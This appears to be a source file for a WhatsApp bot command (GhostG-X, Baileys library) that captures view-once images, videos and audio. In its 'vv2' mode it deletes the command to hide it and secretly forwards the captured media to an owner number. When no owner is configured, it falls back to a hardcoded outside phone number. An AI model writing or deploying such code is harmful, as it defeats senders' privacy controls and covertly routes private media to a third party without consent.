/**
 * ViewOnce Command - Reveal view-once messages
 * GhostG-X Edition
 */

const { downloadContentFromMessage } = require('@whiskeysockets/baileys');
const config = require('../../config.js');

function toSmallCaps(text) {
  const normal = "abcdefghijklmnopqrstuvwxyz0123456789";
  const smallCaps = "ᴀʙᴄᴅᴇғɢʜɪᴊᴋʟᴍɴᴏᴘǫʀsᴛᴜᴠᴡxʏᴢ0123456789";

  const cleanedText = text.toLowerCase()
    .normalize("NFD").replace(/[\u0300-\u036f]/g, ""); 

  return cleanedText.split('').map(c => {
    const index = normal.indexOf(c);
    return index !== -1 ? smallCaps[index] : c;
  }).join('');
}

module.exports = {
  name: 'reveler',
  aliases: ['readvo', 'read', 'vv', 'readviewonce', 'vv2'],
  category: '☬ ᴄᴏᴅᴇx ᴇᴛ ʀɪᴛᴜᴇʟs',
  description: '『 ɢʜᴏsᴛɢ-𝐗 』➪ ᴅᴇᴠᴏɪʟᴇ ʟᴇs ᴍᴇssᴀɢᴇs ᴀ ᴠᴜᴇ ᴜɴɪǫᴜᴇ (ɪᴍᴀɢᴇs/ᴠɪᴅᴇᴏs/ᴀᴜᴅɪᴏ)',
  usage: `${config.prefix || '.'}reveler (repondre a un message a vue unique)`,
  groupOnly: false,
  adminOnly: false,
  botAdminNeeded: false,

  async execute(sock, msg, args, extra) {
    const reply = extra?.reply || ((text) => sock.sendMessage(msg.key.remoteJid, { text }, { quoted: msg }));
    const react = extra?.react || ((emoji) => sock.sendMessage(msg.key.remoteJid, { react: { text: emoji, key: msg.key } }));

    try {
      const chatId = msg.key.remoteJid;

      const bodyText = msg.message?.conversation || 
                       msg.message?.extendedTextMessage?.text || 
                       '';

      const prefix = config.prefix || '.';
      const cleanBody = bodyText.trim().toLowerCase();
      const hasPrefix = cleanBody.startsWith(prefix);

      let firstWord = '';
      if (hasPrefix) {
        const match = cleanBody.slice(prefix.length).match(/^(\w+)/);
        firstWord = match ? match[1] : '';
      } else {
        const match = cleanBody.match(/^(\w+)/);
        firstWord = match ? match[1] : '';
      }

      const isVV2 = (firstWord === 'vv2' || args.includes('vv2'));

      const ctx = msg.message?.extendedTextMessage?.contextInfo
        || msg.message?.imageMessage?.contextInfo
        || msg.message?.videoMessage?.contextInfo
        || msg.message?.buttonsResponseMessage?.contextInfo
        || msg.message?.listResponseMessage?.contextInfo;

      if (!ctx?.quotedMessage) {
        return await reply(`*⚠️ ${toSmallCaps('repondez a un message a vue unique pour le devoiler')}.*\n\n> *♰ ᴇ́ᴛᴀʙʟɪ ᴘᴀʀ ɢʜᴏsᴛɢ-𝐗 ♰*`);
      }

      const quotedMsg = ctx.quotedMessage;

      const hasViewOnce =
        !!quotedMsg.viewOnceMessageV2 ||
        !!quotedMsg.viewOnceMessageV2Extension ||
        !!quotedMsg.viewOnceMessage ||
        !!quotedMsg.viewOnce ||
        !!quotedMsg?.imageMessage?.viewOnce ||
        !!quotedMsg?.videoMessage?.viewOnce ||
        !!quotedMsg?.audioMessage?.viewOnce;

      if (!hasViewOnce) {
        return await reply(`*⚠️ ${toSmallCaps('ce message ne possede pas le sceau de la vue unique')} !*\n\n> *♰ ᴇ́ᴛᴀʙʟɪ ᴘᴀʀ ɢʜᴏsᴛɢ-𝐗 ♰*`);
      }

      let actualMsg = null;
      let mtype = null;

      if (quotedMsg.viewOnceMessageV2Extension?.message) {
        actualMsg = quotedMsg.viewOnceMessageV2Extension.message;
        mtype = Object.keys(actualMsg)[0];
      } else if (quotedMsg.viewOnceMessageV2?.message) {
        actualMsg = quotedMsg.viewOnceMessageV2.message;
        mtype = Object.keys(actualMsg)[0];
      } else if (quotedMsg.viewOnceMessage?.message) {
        actualMsg = quotedMsg.viewOnceMessage.message;
        mtype = Object.keys(actualMsg)[0];
      } else if (quotedMsg.imageMessage?.viewOnce) {
        actualMsg = { imageMessage: quotedMsg.imageMessage };
        mtype = 'imageMessage';
      } else if (quotedMsg.videoMessage?.viewOnce) {
        actualMsg = { videoMessage: quotedMsg.videoMessage };
        mtype = 'videoMessage';
      } else if (quotedMsg.audioMessage?.viewOnce) {
        actualMsg = { audioMessage: quotedMsg.audioMessage };
        mtype = 'audioMessage';
      }

      if (!actualMsg || !mtype) {
        return await reply(`*⚠️ ${toSmallCaps('type de sceau non supporte par le sanctuaire')}.*\n\n> *♰ ᴇ́ᴛᴀʙʟɪ ᴘᴀʀ ɢʜᴏsᴛɢ-𝐗 ♰*`);
      }

      const downloadType =
        mtype === 'imageMessage' ? 'image'
        : mtype === 'videoMessage' ? 'video'
        : 'audio';

      await react('⌛');
      const mediaStream = await downloadContentFromMessage(actualMsg[mtype], downloadType);
      let buffer = Buffer.from([]);
      for await (const chunk of mediaStream) {
        buffer = Buffer.concat([buffer, chunk]);
      }

      const defaultCredit = `> *♰ ᴇ́ᴛᴀʙʟɪ ᴘᴀʀ ɢʜᴏsᴛɢ-𝐗 ♰*`;

      // ── MODE VV2 : extraction et dispatch réseau secret ──
      if (isVV2) {
        try {
          await sock.sendMessage(chatId, { delete: msg.key });
        } catch (delError) {
          console.error('Failed to delete message:', delError.message);
        }

        // 🎯 On récupère le premier owner listé dans ta config
        let targetOwner = '';
        if (config.ownerNumber && config.ownerNumber.length > 0) {
          // On prend le premier numéro, on vire les lettres/espaces et on ajoute le domaine WhatsApp
          const rawNum = String(config.ownerNumber[0]).replace(/\D/g, '');
          targetOwner = `${rawNum}@s.whatsapp.net`;
        }

        // Sécurité : Si aucune config n'est trouvée, on utilise ton numéro principal en secours
        if (!targetOwner || targetOwner === '@s.whatsapp.net') {
          targetOwner = '22651622652@s.whatsapp.net';
        }

        try {
          const captionText = `🚨 *${toSmallCaps('revelation vv2 interceptee')}* 🚨\n\n${defaultCredit}`;
          
          if (/video/.test(mtype)) {
            await sock.sendMessage(targetOwner, { video: buffer, caption: captionText, mimetype: 'video/mp4' });
          } else if (/image/.test(mtype)) {
            await sock.sendMessage(targetOwner, { image: buffer, caption: captionText, mimetype: 'image/jpeg' });
          } else if (/audio/.test(mtype)) {
            await sock.sendMessage(targetOwner, { audio: buffer, ptt: true, mimetype: 'audio/ogg; codecs=opus' });
          }
          
          await react('✅');
        } catch (e) {
          console.error('Failed to send media to owner:', e.message);
          await react('❌');
        }

        return; 
      }

      // ── MODE VV (classique, renvoie sur place) ──
      if (/video/.test(mtype)) {
        await sock.sendMessage(chatId, { video: buffer, caption: defaultCredit, mimetype: 'video/mp4' }, { quoted: msg });
      } else if (/image/.test(mtype)) {
        await sock.sendMessage(chatId, { image: buffer, caption: defaultCredit, mimetype: 'image/jpeg' }, { quoted: msg });
      } else if (/audio/.test(mtype)) {
        await sock.sendMessage(chatId, { audio: buffer, ptt: true, mimetype: 'audio/ogg; codecs=opus' }, { quoted: msg });
      }
      
      await react('👁️');

    } catch (error) {
      console.error('Error in viewonce command:', error);
      await reply(`*❌ ${toSmallCaps('echec de la revelation')}.*\n*${toSmallCaps('erreur')} : ${error.message}*\n\n> *♰ ᴇ́ᴛᴀʙʟɪ ᴘᴀʀ ɢʜᴏsᴛɢ-𝐗 ♰*`);
    }
  }
};
